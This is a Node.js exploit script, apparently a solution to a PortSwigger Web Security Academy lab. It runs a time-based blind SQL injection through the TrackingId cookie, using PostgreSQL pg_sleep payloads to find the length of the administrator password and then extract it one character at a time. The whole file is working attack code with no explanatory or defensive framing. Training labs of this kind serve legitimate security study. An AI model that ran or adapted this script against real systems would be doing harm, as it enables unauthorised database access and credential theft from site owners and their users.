const utils = require('../utils');

const host = 'accc1fa71e74626f807f92ab001300c6.web-security-academy.net'
const responseMatchingDelaySeconds = 5

const maxPasswordLength = 100

const headers = utils.stringToHeaders(`Host: ${host}`)

console.log('Starting blinded password search on host=%ss', host)

async function main() {
  console.log('Determining pasword length...')

  let [body, options] = await utils.async_https_get('https://' + host + '/', headers);
  const trackingId = utils.getHeaderValue(options, 'set-cookie', 'trackingId')
  const sessionId = utils.getHeaderValue(options, 'set-cookie', 'session')

  let exit = 0;
  let i = 0;
  for (i = 0; i < maxPasswordLength && !exit; i++) {
    const headerLenCookie = `TrackingId=${trackingId}' AND (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username = 'administrator')) = ${i + 1}) THEN 'a'||pg_sleep(${responseMatchingDelaySeconds}) ELSE 'a' END)='a'-- ; session=${sessionId}`
    headers['Cookie'] = headerLenCookie;
    let start = new Date();
    await utils.async_https_get('https://' + host + '/', headers)
    if ((new Date() - start) / 1000 >= responseMatchingDelaySeconds)
      exit = 1
  }

  const passwordLen = i
  console.log(`Password length detected: ${passwordLen}`)

  console.log('Determining pasword symbols...')
  let password = '' 
  for (i = 0; i < passwordLen; i++) {
    for (let ascii = 32; ascii < 128; ascii++) {
      if (ascii == 39 || ascii == 59) continue;
      const headerLenCookie = `TrackingId=${trackingId}' AND (SELECT CASE WHEN ((SELECT SUBSTR((SELECT password FROM users WHERE username = 'administrator'), ${i + 1}, 1)) = '${String.fromCharCode(ascii)}') THEN 'a'||pg_sleep(${responseMatchingDelaySeconds}) ELSE 'a' END)='a'-- ; session=${sessionId}`
      headers['Cookie'] = headerLenCookie;
      let start = new Date();
      await utils.async_https_get('https://' + host + '/', headers)
      if ((new Date() - start) / 1000 >= responseMatchingDelaySeconds) {
        password += String.fromCharCode(ascii)
        console.log('Password: %s', password)
        break
      }
    }
  }
}

main()